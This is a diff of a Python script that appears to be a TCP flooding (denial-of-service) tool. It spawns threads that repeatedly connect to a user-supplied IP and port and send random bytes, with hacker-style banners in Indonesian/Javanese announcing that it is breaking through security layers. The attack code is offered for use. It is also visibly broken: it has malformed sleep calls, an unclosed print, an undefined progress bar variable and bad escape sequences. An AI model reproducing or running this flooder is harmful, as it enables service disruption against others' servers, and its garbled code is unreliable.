@@ -65,14 +65,22 @@ packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
 print("\033[31m⁸⁹⁰⁰⁰⁰⁸")
 thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
 print("\033[94m⁸⁹⁰⁰⁰⁰⁸")
-
+print("\033[92mBIRUH BIDDAM NAFDIKA YAA AQSHA 033[0m ",
+print("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> SIYAP-SIYAP GOLEK SERVER \033[0m ",
+time.sleep(0,1),
+print("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> MIWITI GOLEK SAMBUNGAN \033[0m ",
+time.sleep(0,1),
+print("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> NEMBUS LAPISAN KEAMANAN \033[0m ",
+time.sleep(0,1),
+print("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> DIGAWE SAMBUNGAN \033[0m ",
+time.sleep(0,1),
 
 
 def animated_marker():
     widgets = ['\033[33m[\033[31m#\933[33mLoading: FormatLabel.Animated Bouncer()\033[0m']
     pbar = ProgressBar(widgets=widgets).start()
     for i in range(180):
-        time.sleep(0,5)
+        time.sleep(0,1)
         bar.update(i)
 
 
@@ -80,25 +88,18 @@ animated_marker()
 
 def start():
    r = random._urandom(10)
-   u = int((0)
-   while True
+   u = int(0)
+   while True:
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((ip,port))
          s.send(r)
          u += 1
          print("\033[92m[\033[97m+\033[92m]\033[92m0ps BADAI GURUN " +str(u)+ " \033[93mZNEEPER B453 " +str()+ " \033[1m" +ip+ "\033[0m" )
-    except:
-      s.close()
-      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
+       finally:
+         s.close()
+         print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
 
 for x in range(thread):
   thred = threading.Thread(target=start)
   thred.start()
-
-
-
-
-
-
-
